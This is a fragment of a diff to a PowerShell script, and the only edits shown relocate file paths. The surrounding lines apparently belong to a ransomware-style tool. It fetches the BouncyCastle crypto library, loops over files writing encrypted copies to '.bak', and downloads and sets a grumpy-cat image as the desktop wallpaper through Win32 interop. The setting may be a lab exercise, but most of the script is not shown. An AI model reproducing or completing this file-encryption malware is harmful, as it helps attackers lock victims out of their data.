@@ -1,6 +1,6 @@
-﻿Invoke-WebRequest -Uri 'https://www.bouncycastle.org/csharp/download/bccrypto-csharp-1.9.0-bin.zip' -OutFile 'C:\Users\Luc Tran\Desktop\crypto.zip'
-Expand-Archive 'C:\Users\Luc Tran\Desktop\crypto.zip' -DestinationPath .
-Add-Type -path "C:\Users\Luc Tran\Desktop\BouncyCastle.Crypto.dll"
+﻿Invoke-WebRequest -Uri 'https://www.bouncycastle.org/csharp/download/bccrypto-csharp-1.9.0-bin.zip' -OutFile 'C:\VNCS\crypto.zip'
+Expand-Archive 'C:\VNCS\crypto.zip' -DestinationPath .
+Add-Type -path "C:\VNCS\BouncyCastle.Crypto.dll"
 $global:encMessage=''
 Function Get-Cipher{
 Param ($Message)
@@ -76,8 +76,8 @@ foreach($f in $file){
     $global:encMessage | Out-File -FilePath ./$f.bak
     }
 }
-Invoke-WebRequest -Uri 'https://c4.wallpaperflare.com/wallpaper/927/710/567/6-cat-funny-grumpy-wallpaper-thumb.jpg' -OutFile 'C:\Users\Luc Tran\Desktop\Nice.jpg'
-$MyWallpaper="C:\Users\Luc Tran\Desktop\Nice.jpg"
+Invoke-WebRequest -Uri 'https://c4.wallpaperflare.com/wallpaper/927/710/567/6-cat-funny-grumpy-wallpaper-thumb.jpg' -OutFile 'C:\VNCS\Nice.jpg'
+$MyWallpaper="C:\VNCS\Nice.jpg"
 $code = @' 
 using System.Runtime.InteropServices; 
 namespace Win32{ 
